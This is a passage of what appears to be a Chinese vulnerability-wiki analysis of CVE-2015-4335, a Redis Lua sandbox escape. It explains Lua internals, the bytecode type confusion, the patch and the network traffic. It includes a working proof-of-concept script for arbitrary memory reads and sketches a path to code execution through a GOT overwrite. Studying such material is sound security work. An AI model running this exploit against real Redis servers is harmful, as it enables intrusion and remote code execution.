class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 调用自定义函数</span><br><span class="line">x = string.gsub(<span class="string">&quot;4 + 5 = <span class="variable">$return</span> 4+5$&quot;</span>, <span class="string">&quot;%<span class="subst">$(.-)</span>%$&quot;</span>, <span class="keyword">function</span> (s)</span><br><span class="line">      <span class="built_in">return</span> loadstring(s)()</span><br><span class="line">    end)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 调用表来替换</span><br><span class="line"><span class="built_in">local</span> t = &#123;name=<span class="string">&quot;lua&quot;</span>, version=<span class="string">&quot;5.1&quot;</span>&#125;</span><br><span class="line">x = string.gsub(<span class="string">&quot;<span class="variable">$name</span>-<span class="variable">$version</span>.tar.gz&quot;</span>, <span class="string">&quot;%<span class="subst">$(%w+)</span>&quot;</span>, t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br></pre></td></tr></table></figure><ul><li>有一点需要注意的是，使用函数作为替换结果时，函数只能返回数字、字符串、<code>false</code>和<code>nil</code>。</li></ul><p><strong>string.dump()</strong></p><ul><li>原型：string.dump (function)</li><li>解释：返回一个包含所给函数二进制描述的字符串，以至于在此之后可以使用函数<code>loadstring()</code>利用所得到的字符串来返回一个函数拷贝，需要注意的是函数只能是Lua函数并且没有upvalues(外部局部变量)。</li></ul><hr><p><strong>Usage</strong></p><ul><li>首先新建一个文件将文件命名为dumptest.lua如下代码:</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">--自定义一个函数</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">custom_func</span>(<span class="params">num1, num2</span>)</span></span><br><span class="line"><span class="function">    <span class="title">local</span> <span class="title">ret</span> = <span class="title">num1</span> + <span class="title">num2</span></span>;</span><br><span class="line">    print(<span class="string">&quot;\nnum1 = &quot;</span>..num1)</span><br><span class="line">    print(<span class="string">&quot;num2 = &quot;</span>..num2)</span><br><span class="line">    print(<span class="string">&quot;num1 + num2 = &quot;</span>..ret)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">-- 将函数序列化</span><br><span class="line">local func_content = string.dump(custom_func)</span><br><span class="line">print(<span class="string">&quot;\nfunc_content = &quot;</span>..func_content)</span><br><span class="line"></span><br><span class="line">-- 将转化后的字符串写入文件</span><br><span class="line">local outfile = io.open(<span class="string">&quot;dumptest.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">local outnum = outfile:write(func_content)</span><br><span class="line"><span class="attr">outfile</span>:close()</span><br><span class="line"></span><br><span class="line">-- 从文件总读取内容</span><br><span class="line">local infile = io.open(<span class="string">&quot;dumptest.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">local incontent = infile:read(<span class="string">&quot;*a&quot;</span>)</span><br><span class="line"><span class="attr">infile</span>:close()</span><br><span class="line">print(<span class="string">&quot;\ninput content is &quot;</span>..incontent)</span><br><span class="line"></span><br><span class="line">-- 加载函数</span><br><span class="line">local myfunc = loadstring(incontent)</span><br><span class="line"></span><br><span class="line">-- 执行函数</span><br><span class="line">myfunc(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">myfunc(<span class="number">3</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">-- 输出这个幸福的七月七</span><br><span class="line">myfunc(<span class="string">&quot;7&quot;</span> ,<span class="string">&quot;.7&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;\nthis is a happy day!&quot;</span>)</span><br><span class="line">print(os.date())</span><br></pre></td></tr></table></figure><ul><li>看了这个函数是不是有种非常神奇的感觉，原来传说中的序列化可以离我们这么近。</li><li>在调用了函数<code>string.dump()</code>之后函数<code>custom_func()</code>被转化成字符串保存在文件中，可以在使用时再取出来。</li><li>这个函数一般写逻辑代码应该用不到，更多的是做框架的时候用的功能，进过序列化的函数可以通过网络传送、转化、再使用。</li></ul><p><strong>loadstring()</strong></p><ul><li>loadstring(string [,chunkname])</li><li>解释：函数会从所给的字符串中来加载程序块并运行，常使用这种构造式来调用<code>assert(loadstring(s))()</code>，如果省略参数<code>chunkname</code>，那么它默认为所给的字符串。</li></ul><hr><p><strong>usage</strong></p><ul><li>首先我们新建一个文件将文件命名为loadstring.lua然后编写代码如下：</li></ul><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">--</span> 简单测试</span><br><span class="line">local ret <span class="operator">=</span> loadstring(<span class="string">&quot;print(<span class="subst">\&quot;</span>first test loadstring function.<span class="subst">\&quot;</span>)&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\n</span>the result ret is&quot;</span>, ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 运行返回值</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\n</span>the result of running ret() is:&quot;</span>)</span><br><span class="line">ret();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 使用常用的方式</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\n</span>the result of running common test is:&quot;</span>)</span><br><span class="line"><span class="built_in">assert</span>(loadstring(<span class="string">&quot;print(<span class="subst">\&quot;</span>common test loadstring function.<span class="subst">\&quot;</span>)&quot;</span>))()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 直接生成一个全局函数</span><br><span class="line">local <span class="function"><span class="keyword">func</span> <span class="title">=</span> </span>loadstring(<span class="string">&quot;function func_test(str) print(<span class="subst">\&quot;</span>str = <span class="subst">\&quot;</span>, str) end&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 测试函数是否生成</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\n</span>before run func, functest =&quot;</span>, func_test)</span><br><span class="line"><span class="function"><span class="keyword">func</span>()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\n</span>after run func, functest =&quot;</span>, func_test, <span class="string">&quot;<span class="subst">\n</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 测试参数chunkname的作用</span><br><span class="line"><span class="built_in">assert</span>(loadstring(<span class="string">&quot;i = i + 1&quot;</span>, <span class="string">&quot;third test&quot;</span>))()</span><br></pre></td></tr></table></figure><ul><li>由结果一可知，函数<code>loadstring()</code>与函数<code>loadfile()</code>一样，都是返回一个函数。</li><li>由结果二可知，返回函数的内容就是字符串参数<code>string</code>的内容，执行返回的函数时，字符串中的代码就被执行了。</li><li>结果三展示了这个函数的一般使用方法。</li><li>结果四展示了如何通过字符串生成一个全局函数，但是无法生成局部函数，并且生成的函数<code>func_test()</code>在调用完函数<code>func()</code>之后才被创建出来</li><li>最后一个例子展示了参数<code>chunkname</code>的作用，就是在错误的提示信息中起到提示作用。</li></ul><h4 id="lua数据结构–闭包"><a href="#lua数据结构–闭包" class="headerlink" title="lua数据结构–闭包"></a><strong>lua数据结构–闭包</strong></h4><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/7.png"></p><p>闭包主要由以下2个元素组成：</p><p><strong>函数原型：</strong>上图意在表明是一段可执行代码。在Lua中可以是lua_CFunction，也可以是lua自身的虚拟机指令。</p><p>上下文环境：在Lua里主要是Upvalues和env，下面会有说明Upvalues和env。 在Lua里，我们也从闭包开始，逐步看出整个结构模型，下面是Closure的数据结构：(lobject.h 291-312)</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/8.png"></p><p>​        Lua的闭包分成2类，一类是CClosure，即luaC函数的闭包。另一类是LClosure，是Lua里面原生的函数的闭包。</p><p>​        分析一下两类Closure相同部分ClosureHeader：</p><ul><li><p>CommonHeader：和与TValue中的GCHeader能对应起来的部分</p></li><li><p>isC：是否CClosure</p></li><li><p>nupvalues：外部对象个数</p></li><li><p>gclist：用于GC销毁</p></li><li><p>env：函数的运行环境</p></li></ul><p>对于CClosure数据结构：</p><ul><li><p>lua_CFunction f：函数指针，指向自定义的C函数</p></li><li><p>TValue upvalue[1]：C的闭包中，用户绑定的任意数量个upvalue</p></li></ul><p>对于LClosure数据结构：</p><ul><li><p>Proto *p：Lua的函数原型，在下面会有详细说明</p></li><li><p>UpVal *upvals：Lua的函数upvalue，这里的类型是UpVal，这里之所以不直接用TValue是因为具体实现需要一些额外数据。</p></li></ul><p><strong>UpVal的实现</strong></p><p>什么是UpVal？先来看看代码：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/9.png"></p><p>​        分析一下上面这段代码，最终testB的值显然是3+5+10=18。当调用testA(5)的时候，其实是在调用FuncB(5)，但是这个FuncB知道a = 3，这个是由<strong>FuncA调用时</strong>，记录到FuncB的<strong>外部变量</strong>，我们把a和c称为FuncB的upvalue。</p><p>​        下面描述一下<strong>Lua中的原生函数的函数原型</strong>，即<strong>Proto数据结构</strong>（lobject.h 231-253）：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/12.png"></p><ul><li><p>CommonHeader：Proto也是需要回收的对象，也会有与GCHeader对应的CommonHeader</p></li><li><p>TValue* k：函数使用的常量数组，比如local d = 10，则会有一个10的数值常量</p></li><li><p>Instruction *code：虚拟机指令码数组</p></li><li><p>Proto **p：函数里定义的函数的函数原型，比如funcA里定义了funcB，在funcA的5. Proto中，这个指针的[0]会指向funcB的Proto</p></li><li><p>int *lineinfo：主要用于调试，每个操作码所对应的行号</p></li><li><p>LocVar *locvars：主要用于调试，记录每个本地变量的名称和作用范围</p></li><li><p>TString **upvalues：一来用于调试，二来用于给API使用，记录所有upvalues的名称</p></li><li><p>TString *source：用于调试，函数来源，如c:\t1.lua@ main</p></li><li><p>sizeupvalues： upvalues名称的数组长度</p></li><li><p>sizek：常量数组长度</p></li><li><p>sizecode：code数组长度</p></li><li><p>sizelineinfo：lineinfo数组长度</p></li><li><p>sizep：p数组长度</p></li><li><p>sizelocvars：locvars数组长度</p></li><li><p>linedefined：函数定义起始行号，即function语句行号</p></li><li><p>lastlinedefined：函数结束行号，即end语句行号</p></li><li><p>gclist：用于回收</p></li><li><p>nups：upvalue的个数，其实在Closure里也有nupvalues，这里我也不太清楚为什么要弄两个，nups是语法分析时会生成的，而nupvalues是动态计算的。</p></li><li><p>numparams：参数个数</p></li><li><p>is_vararg：是否参数是”…”（可变参数传递）</p></li><li><p>maxstacksize：函数所使用的stacksize</p><p>​    Proto的所有参数都是在<strong>语法分析和中间代码生成时获取的</strong>，相当于编译出来的汇编码一样是不会变的，动态性是在Closure中体现的。</p></li></ul><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><p>​        利用到的漏洞分别为OP_FORPREP/OP_FORLOOP、OP_CLOSURE中的类型混淆，LUA提供了string.dump将一个lua函数dump为LUA字节码，同时loadstring函数加载字节码为LUA函数，通过操作LUA原始字节码可以使得LUA解释器进入特殊状态，甚至导致BUG发生。</p><p>具备任意地址读/写能力后是一定可以做代码执行的，目前想到如下两种方式。</p><p><strong>1) 覆写CClosure-&gt;f</strong></p><p>​        在lua中可以使用coroutine.wrap创建C函数闭包对象CClosure，其结构如下：</p><p>​        CClosure-&gt;f指向函数指针，调用其对应的源码为deps/lua/src/ldo.c 307-326：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/22.png"></p><p><strong>2) 覆写got</strong></p><p>​        Linux PWN常规思路，通过DynELF解析Binary，进一步解析libc，获取system地址并覆写至fputs.got；在lua中调用print(“id”)即可执行命令。</p><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>​        利用到的漏洞分别为OP_FORPREP/OP_FORLOOP、OP_CLOSURE中的类型混淆，LUA提供了string.dump将一个lua函数dump为LUA字节码，同时loadstring函数加载字节码为LUA函数，通过操作LUA原始字节码可以使得LUA解释器进入特殊状态，甚至导致BUG发生。</p><p>​        这里以Redis 3.0.0版本进行分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!cpp</span><br><span class="line">asnum = loadstring(string.dump(function(x)</span><br><span class="line">  for i = x, x, 0 do</span><br><span class="line">    return i</span><br><span class="line">  end</span><br><span class="line">end):gsub(&quot;\96%z%z\128&quot;, &quot;\22\0\0\128&quot;))</span><br></pre></td></tr></table></figure><p>LUA字节码固定长度32bits，4字节，定义如下：</p><p>主要由op操作码、R(A)、R(B)、R(C)、R(Bx)、R(sBx)组成。A、B、C对应于LUA寄存器索引。</p><p>asnum函数可以将任意LUA对象转换为数字。（注：LUA5.1 64bitLinux环境）gsub函数将字节码<code>\96%z%z\128</code>替换为<code>\22\0\0\128</code>。</p><p><strong>1) OP_FORPREP/OP_FORLOOP</strong></p><p>​        lua中对for循环生成的字节码，利用luadec反编译工具查看.out文件的字节码如下：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/2.png"></p><p>​        可以看到for循环是由FORPREP、FORLOOP两条指令组合而来，对应的源码是deps/lua/src/lvm.c 的luaV_execute函数（line 654-680）：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/3.png"></p><p>​        在OP_FORPREP中，lua对参数进行类型检查，判断是否为number类型，若不是则触发错误；然而在OP_FORLOOP中，因已做过类型检查，便假定参数为number类型，并对其执行idx = idx + step操作，这导致任意类型到number类型的混淆。</p><p>​        如下修改字节码中的FORPREP指令<code>\96%z%z\128</code>为JMP指令<code>\22\0\0\128</code>，gsub函数将字节码<code>\96%z%z\128</code>替换为<code>\22\0\0\128</code>，如下。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/4.png"></p><p>​        正常情况下lua在forprep指令会检查参数是否为数字类型，并执行初始化，但是由于执行gsub函数后，forprep字节码被替换为JMP to 5，直接跳过OP_FORPREP中的类型检查，直接进入OP_FORLOOP (5)：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/5.png"></p><p>​        forloop指令直接将循环参数转换为lua_Number(double)类型，（因为正常情况下forprep已经检查过类型了），然后执行加法（+ 0），执行dojump return x；返回lua_Number。LUA使用TValue表示通用数据对象，格式如下:</p><table><thead><tr><th>Value(64bit)</th><th>tt(32bit)</th><th>padd(32bit)</th></tr></thead><tbody><tr><td>n</td><td><code>LUA_TNUMBER</code></td><td></td></tr><tr><td><code>GCObject *gc; -&gt; TString*</code></td><td><code>LUA_TSTRING</code></td><td></td></tr><tr><td><code>GCObject *gc; -&gt; Closure*</code></td><td><code>LUA_TFUNCTION</code></td><td></td></tr></tbody></table><p><strong>2) OP_CLOSURE</strong></p><p>​        LUA使用CLOSURE A Bx指令创建函数的一个实例(或闭包)。Bx是要实例化的函数在函数原型表中的函数编号。例如：closure 2 0 ，创建0号函数对象，结果保存到2号寄存器。对CLOSURE指令的处理位于deps/lua/src/lvm.c 的luaV_execute函数（line 723-742）：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/6.png"></p><p>​        line 731-737是对闭包的处理，具体为在CLOSURE指令后后生成对应的MOVE指令，MOVE指令的第二个参数为闭包变量引用。正常情况下引用只能指向当前栈桢中的局部变量，但通过修改字节码，可以将其指向至任意位置。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/13.png"></p><p>​        如上，通过修改”(\100%z%z%z)….”（MOVE 0 0）为”%1\0\0\0\1”（MOVE 0 2），将middle函数中的magic引用指向middle函数自身（R2），所以输出的结果为middle函数。</p><p>​        对函数调用的处理位于deps/lua/src/lvm.c line 586-606：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/14.png"></p><p>​         对函数返回的处理位于deps/lua/src/lvm.c line 382-390：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/15.png"></p><p>​        line 385将L-&gt;ci-&gt;func（当前函数指针）转换为Closure指针，由上文可知，通过修改字节码可以将闭包变量引用指向当前函数指针，导致任意类型到Closure类型的混淆。</p><p>​        基于此，结合number类型混淆，可以做任意地址读/写：</p><p>​        结尾处修改字节码，将middle/inner函数中的magic引用指向middle函数；inner函数中将magic赋值为字符串，这使得middle函数中的当前函数指针将被混淆为该字符串，函数返回； middle函数中读取闭包变量magic，读取闭包变量对应的源码为deps/lua/src/lvm.c line 427-431：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/16.png"></p><p>​        其实际上是去当前函数指针的upvals字段中获取相应引用，而当前函数指针已被混淆为字符串，对应的upvals字段可控。</p><p>TString类型与Closure类型的结构如下：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/17.png"></p><p>​        变量upval为字符串，as_double(upval)获取其TString指针，偏移24获取到upval-&gt;str地址，也就是说cl-&gt;p、cl-&gt;upvals[0]都指向输入的字符串”commonhead16bits” .. p32(lo) .. p32(hi)。</p><p>​        UpVal结构如下：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/18.png"></p><p>​        所以cl-&gt;upvals[0]-&gt;v指向构造的指针p32(lo) .. p32(hi)，也即为addr。</p><p>​        以上，便将任意地址的前8字节读取出来，写操作也是同理，只需要在middle函数中对magic赋值，需注意的是写操作实际会写入8字节数值及4字节tt类型：</p><p>​        deps/lua/src/lvm.c line 451-456：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/19.png"></p><p>​        deps/lua/src/lobject.h line 161-164：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/20.png"></p><p>触发poc.lua</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!cpp</span><br><span class="line">asnum = loadstring(string.dump(function(x)</span><br><span class="line">  for i = x, x, 0 do</span><br><span class="line">    return i</span><br><span class="line">  end</span><br><span class="line">end):gsub(&quot;\96%z%z\128&quot;, &quot;\22\0\0\128&quot;))</span><br><span class="line"></span><br><span class="line">ub4 = function(x) -- Convert little endian uint32_t to char[4]</span><br><span class="line">  local b0 = x % 256; x = (x - b0) / 256</span><br><span class="line">  local b1 = x % 256; x = (x - b1) / 256</span><br><span class="line">  local b2 = x % 256; x = (x - b2) / 256</span><br><span class="line">  local b3 = x % 256</span><br><span class="line">  return string.char(b0, b1, b2, b3)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">f2ii = function(x) -- Convert double to uint32_t[2]</span><br><span class="line">  if x == 0 then return 0, 0 end</span><br><span class="line">  if x &lt; 0 then x = -x end</span><br><span class="line"></span><br><span class="line">  local e_lo, e_hi, e, m = -1075, 1023</span><br><span class="line">  while true do -- this loop is math.frexp</span><br><span class="line">    e = (e_lo + e_hi)</span><br><span class="line">    e = (e - (e % 2)) / 2</span><br><span class="line">    m = x / 2^e</span><br><span class="line">    if m &lt; 0.5 then e_hi = e elseif 1 &lt;= m then e_lo = e else break end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if e+1023 &lt;= 1 then</span><br><span class="line">    m = m * 2^(e+1074)</span><br><span class="line">    e = 0</span><br><span class="line">  else</span><br><span class="line">    m = (m - 0.5) * 2^53</span><br><span class="line">    e = e + 1022</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  local lo = m % 2^32</span><br><span class="line">  m = (m - lo) / 2^32</span><br><span class="line">  local hi = m + e * 2^20</span><br><span class="line">  return lo, hi</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">ii2f = function(lo, hi) -- Convert uint32_t[2] to double</span><br><span class="line">  local m = hi % 2^20</span><br><span class="line">  local e = (hi - m) / 2^20</span><br><span class="line">  m = m * 2^32 + lo</span><br><span class="line"></span><br><span class="line">  if e ~= 0 then</span><br><span class="line">    m = m + 2^52</span><br><span class="line">  else</span><br><span class="line">    e = 1</span><br><span class="line">  end</span><br><span class="line">  return m * 2^(e-1075)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">read_mem = loadstring(string.dump(function(mem_addr) -- AAAABBBB 1094795585 1111638594</span><br><span class="line">  local magic=nil</span><br><span class="line">  local function middle()</span><br><span class="line">    local f2ii, asnum = f2ii, asnum</span><br><span class="line">    local lud, upval</span><br><span class="line">    local function inner()</span><br><span class="line">      magic = &quot;01234567&quot;</span><br><span class="line">      local lo,hi = f2ii(mem_addr)</span><br><span class="line">      upval = &quot;commonhead16bits&quot;..ub4(lo)..ub4(hi)</span><br><span class="line">      lo,hi = f2ii(asnum(upval));lo = lo+24</span><br><span class="line">      magic = magic..ub4(lo)..ub4(hi)..ub4(lo)..ub4(hi)</span><br><span class="line">    end</span><br><span class="line">    inner()</span><br><span class="line">    return asnum(magic)</span><br><span class="line">  end</span><br><span class="line">  magic = middle()</span><br><span class="line">  return magic</span><br><span class="line">end):gsub(&quot;(\164%z%z%z)....&quot;, &quot;%1\0\0\128\1&quot;, 1))  --&gt; move 0,3</span><br><span class="line"></span><br><span class="line">x=&quot;AAAABBBB&quot;</span><br><span class="line">l,h=f2ii(asnum(x))</span><br><span class="line">x=ii2f(l+24,h)</span><br><span class="line">print(f2ii(read_mem(x)))</span><br></pre></td></tr></table></figure><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>​        漏洞是因为加载字节码导致的，Redis中的修复，直接禁止字节码加载：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/11.png"></p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>​        直接eval命令发lua字节码脚本</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/10.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="http://redis.io/commands/ZADD">http://redis.io/commands/ZADD</a></li><li><a href="http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/">http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/</a></li><li><a href="https://github.com/redis/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411">https://github.com/redis/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411</a></li><li><a href="https://github.com/viruscamp/luadec">https://github.com/viruscamp/luadec</a></li><li><a href="https://juejin.cn/post/6844903572673396750">https://juejin.cn/post/6844903572673396750</a></li><li><a href="https://gist.github.com/corsix/6575486">https://gist.github.com/corsix/6575486</a></li><li><a href="https://www.bbsmax.com/A/mo5kZWW2Jw/">https://www.bbsmax.com/A/mo5kZWW2Jw/</a></li></ul></blockquote>]]></content>
    
    
      
      
